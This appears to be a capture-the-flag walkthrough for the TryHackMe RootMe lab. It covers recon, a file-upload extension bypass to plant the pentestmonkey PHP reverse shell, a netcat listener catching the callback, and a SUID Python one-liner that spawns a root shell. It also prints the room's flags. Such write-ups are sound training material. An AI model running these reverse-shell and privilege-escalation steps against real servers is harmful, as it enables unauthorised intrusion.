# 🔴 RootMe — TryHackMe Walkthrough

<p align="center">
  <img src="https://tryhackme-badges.s3.amazonaws.com/ahilya.png" alt="TryHackMe Badge" />
</p>

> **Room:** [RootMe](https://tryhackme.com/room/rrootme)  
> **Difficulty:** 🟢 Easy  
> **Category:** Web Exploitation · Privilege Escalation  
> **OS:** Linux (Ubuntu)  
> **Status:** ✅ Completed  

---

## 📋 Table of Contents

1. [Room Overview](#-room-overview)
2. [Reconnaissance](#-1-reconnaissance)
   - [Ping](#-ping)
   - [Nmap Scan](#-nmap-scan)
   - [Directory Enumeration](#-directory-enumeration)
3. [Exploitation](#-2-exploitation)
   - [PHP Reverse Shell Setup](#-php-reverse-shell-setup)
   - [Extension Filter Bypass](#-extension-filter-bypass)
   - [Uploading the Shell](#-uploading-the-shell)
   - [Catching the Shell](#-catching-the-shell)
4. [Post-Exploitation](#-3-post-exploitation)
   - [Stabilising the Shell](#-stabilising-the-shell)
   - [User Flag](#-user-flag)
   - [Privilege Escalation — SUID](#-privilege-escalation--suid)
   - [Root Flag](#-root-flag)
5. [Flags](#-flags)
6. [Tools Used](#-tools-used)
7. [Key Takeaways](#-key-takeaways)

---

## 🗺 Room Overview

RootMe is a beginner-friendly TryHackMe room centred on two core concepts:

- **Web exploitation** — bypassing a file upload filter to get a reverse shell on the server
- **Privilege escalation** — abusing a misconfigured SUID binary (Python) to escalate from `www-data` to `root`

**Attack path at a glance:**

```
Recon (nmap + dirsearch)
        ↓
Discover /panel/ upload form
        ↓
Upload PHP reverse shell (.php5 extension bypass)
        ↓
Catch shell via Netcat → www-data
        ↓
Find SUID Python binary
        ↓
Exploit SUID → root
        ↓
Capture both flags 🚩
```

---

## 🔍 1. Reconnaissance

### 📡 Ping

Confirm the target machine is alive before scanning:

```bash
ping 10.80.168.182
```

---

### 🗺 Nmap Scan

Run a full service/version detection scan with default NSE scripts:

```bash
nmap 10.80.168.182 -sV -sC
```

<details>
<summary>📄 Full Nmap Output (click to expand)</summary>

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-12 19:47 IST
Nmap scan report for 10.80.168.182
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4c:46:da:2d:19:63:c3:23:ea:b1:a1:9b:c7:1a:5d:61 (RSA)
|   256 4e:84:46:fd:14:6c:0d:ca:49:4b:cd:4c:78:4e:90:ca (ECDSA)
|_  256 4b:16:bc:2a:5a:a3:76:5e:de:27:10:97:29:3a:a1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.82 sec
```

</details>

**Key Findings:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22   | Open  | SSH     | OpenSSH 8.2p1 Ubuntu |
| 80   | Open  | HTTP    | Apache httpd 2.4.41 |

**Analysis:**
- Port **22** — SSH is open but we have no credentials yet, skip for now
- Port **80** — Apache web server running a PHP application (confirmed by `PHPSESSID` cookie with `httponly` flag not set — a security misconfiguration worth noting)
- The `http-title` shows **HackIT - Home** — a custom web app, likely our primary attack vector

> 💾 Full scan saved to [`scans/nmap.txt`](./scans/nmap.txt)

---

### 📂 Directory Enumeration

Brute-force hidden directories and files on the web server:

```bash
dirsearch -u 10.80.168.182
```

<details>
<summary>📄 Full Dirsearch Output (click to expand)</summary>

```
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
Target: http://10.80.168.182/

[19:48:33] 301 -  311B  - /js       -> http://10.80.168.182/js/
[19:49:23] 301 -  312B  - /css      -> http://10.80.168.182/css/
[19:49:41] 200 -  465B  - /js/
[19:49:56] 301 -  314B  - /panel    -> http://10.80.168.182/panel/
[19:49:56] 200 -  388B  - /panel/
[19:50:07] 403 -  278B  - /server-status
[19:50:18] 301 -  316B  - /uploads  -> http://10.80.168.182/uploads/
[19:50:18] 200 -  407B  - /uploads/
```

</details>

**Key Findings:**

| Path        | Status | Description |
|-------------|--------|-------------|
| `/panel/`   | 200    | ⭐ File upload form — our entry point |
| `/uploads/` | 200    | ⭐ Where uploaded files are stored and served |
| `/js/`      | 200    | Static JS assets |
| `/css/`     | 301    | Static CSS assets |

The combination of `/panel/` (upload) and `/uploads/` (execution) is the classic file upload vulnerability pattern. If we can upload a PHP reverse shell and access it via `/uploads/`, we get code execution on the server.

> 💾 Full scan saved to [`scans/dirsearch.txt`](./scans/dirsearch.txt)

---

## 💥 2. Exploitation

### 🐚 PHP Reverse Shell Setup

Clone the pentestmonkey PHP reverse shell — the most widely used one-file reverse shell for PHP targets:

```bash
git clone https://github.com/pentestmonkey/php-reverse-shell.git
cd php-reverse-shell
```

Edit `php-reverse-shell.php` and update the IP and port to your Kali machine:

```php
$ip   = '192.168.218.35';  // ← Your TUN0 / Kali IP
$port = 1234;              // ← Your chosen listening port
```

> 💡 **Find your TUN0 IP:** Run `ip a show tun0` or `ifconfig tun0`

---

### 🔓 Extension Filter Bypass

The `/panel/` upload form blocks `.php` files — a common but bypassable security control.

**Strategy:** Rename the shell to `.php5`. Apache still executes it as PHP:

```bash
cp php-reverse-shell.php shell.php5
```

> **Why does `.php5` work?**  
> Apache is often configured to execute `.php`, `.php3`, `.php4`, `.php5`, and `.phtml` as PHP. The upload filter only blacklists `.php` by name — alternative extensions bypass it entirely.

Other extensions worth trying if `.php5` is blocked:

| Extension | Notes |
|-----------|-------|
| `.php5`   | Works on most Apache configs ✅ |
| `.phtml`  | PHP HTML template, also executed |
| `.php3`   | Legacy, still commonly supported |
| `.pHp`    | Case-sensitivity bypass (Windows targets) |

---

### 📤 Uploading the Shell

1. Navigate to `http://10.80.168.182/panel/`
2. Upload `shell.php5`
3. Verify the file is accessible at `http://10.80.168.182/uploads/shell.php5`

---

### 📞 Catching the Shell

Start a Netcat listener **before** triggering the shell:

```bash
nc -nvlp 1234
```

Then visit `http://10.80.168.182/uploads/shell.php5` in your browser to execute it.

**Expected output on your listener:**

```
listening on [any] 1234 ...
connect to [192.168.218.35] from (UNKNOWN) [10.80.168.182] XXXXX
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

We now have a shell as `www-data`. 

---

## 🛠️ 3. Post-Exploitation

### 💻 Stabilising the Shell

The raw shell is unstable — `Ctrl+C` kills it, arrow keys don't work, and tab completion is broken. Upgrade to a full TTY:

**Step 1 — Spawn a PTY with Python:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Step 2 — Background the shell and fix the terminal:**
```bash
# Press Ctrl+Z to background
stty raw -echo; fg
```

**Step 3 — Set environment variables:**
```bash
export TERM=xterm
export SHELL=bash
stty rows 38 columns 116
```

You now have a fully interactive shell with job control, tab completion, and proper terminal behaviour.

---

### 🚩 User Flag

Search the filesystem for `user.txt`:

```bash
find / -type f -name "user.txt" 2>/dev/null
```

Output:
```
/var/www/user.txt
```

Read the flag:
```bash
cat /var/www/user.txt
```

```
THM{y0u_g0t_a_sh3ll}
```

---

### ⬆️ Privilege Escalation — SUID

**What is SUID?**  
The SUID (Set User ID) bit allows a file to run with the permissions of its **owner** rather than the user executing it. If a root-owned binary has SUID set, anyone who runs it gets root-level execution — making it a powerful privesc vector.

**Step 1 — Find all SUID binaries:**

```bash
find / -type f -perm -u=s 2>/dev/null
```

Scan the output for non-standard binaries. Standard ones (`/usr/bin/passwd`, `/usr/bin/sudo`, etc.) are expected and safe. The suspicious entry here is:

```
/usr/bin/python
```

Python with SUID set — that's our escalation path.

**Step 2 — Verify via GTFOBins:**

Visit [gtfobins.github.io/gtfobins/python/#suid](https://gtfobins.github.io/gtfobins/python/#suid) and use the listed SUID exploit.

**Step 3 — Exploit SUID Python:**

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

The `-p` flag tells `sh` to preserve the effective UID (root), so we inherit root privileges.

**Step 4 — Verify root:**

```bash
id
```

```
uid=0(root) gid=33(www-data) groups=33(www-data)
```

We are root. 🎉

---

### 🚩 Root Flag

```bash
find / -type f -name "root.txt" 2>/dev/null
```

Output:
```
/root/root.txt
```

```bash
cat /root/root.txt
```

```
THM{pr1v1l3g3_3sc4l4t10n}
```

---

## 🚩 Flags

| # | Flag | Location | Value |
|---|------|----------|-------|
| 1 | **User Flag** | `/var/www/user.txt` | `THM{y0u_g0t_a_sh3ll}` |
| 2 | **Root Flag** | `/root/root.txt` | `THM{pr1v1l3g3_3sc4l4t10n}` |

---

## 🧰 Tools Used

| Tool | Command | Purpose |
|------|---------|---------|
| `nmap` | `nmap -sV -sC <IP>` | Port scanning & service enumeration |
| `dirsearch` | `dirsearch -u <IP>` | Web directory brute-forcing |
| [`pentestmonkey/php-reverse-shell`](https://github.com/pentestmonkey/php-reverse-shell) | — | PHP reverse shell payload |
| `netcat` | `nc -nvlp 1234` | Catching the reverse shell connection |
| `python3` | `pty.spawn("/bin/bash")` | Shell stabilisation (PTY upgrade) |
| `python` (SUID) | `os.execl("/bin/sh", "sh", "-p")` | Privilege escalation to root |
| [GTFOBins](https://gtfobins.github.io) | — | SUID exploit reference |

---

## 📌 Key Takeaways

**1. File upload filters are often bypassable**  
Blacklisting `.php` alone is insufficient. Always test alternate extensions (`.php5`, `.phtml`, `.php3`) and MIME type spoofing. Proper defences include whitelist-only extension validation, content-type checking, and storing uploads **outside** the web root.

**2. PHPSESSID without `httponly` is a security misconfiguration**  
The `httponly` flag prevents JavaScript from reading session cookies, guarding against XSS-based session hijacking. Its absence was flagged by nmap — a detail that matters in real-world assessments.

**3. SUID on interpreters is extremely dangerous**  
Unlike compiled binaries, scripting languages (Python, Perl, Ruby) with SUID set can be trivially abused to spawn root shells. Regularly audit your SUID binaries:  
```bash
find / -perm -u=s -type f 2>/dev/null
```

**4. Always stabilise your shell**  
Raw shells drop on `Ctrl+C`. The `python3 pty` + `stty raw -echo` upgrade is essential muscle memory for any pentester.

**5. GTFOBins is your best friend**  
[gtfobins.github.io](https://gtfobins.github.io) catalogs living-off-the-land privilege escalation techniques for almost every Unix binary. Bookmark it — you'll use it constantly.

---

## 📁 Repository Structure

```
Room/Rootme/
├── README.md           ← This walkthrough
└── scans/
    ├── nmap.txt        ← Full nmap scan output
    └── dirsearch.txt   ← Full dirsearch output
```

---

*Walkthrough by **ahilya** | [TryHackMe](https://tryhackme.com/room/rrootme) | For educational purposes only — always hack ethically.*
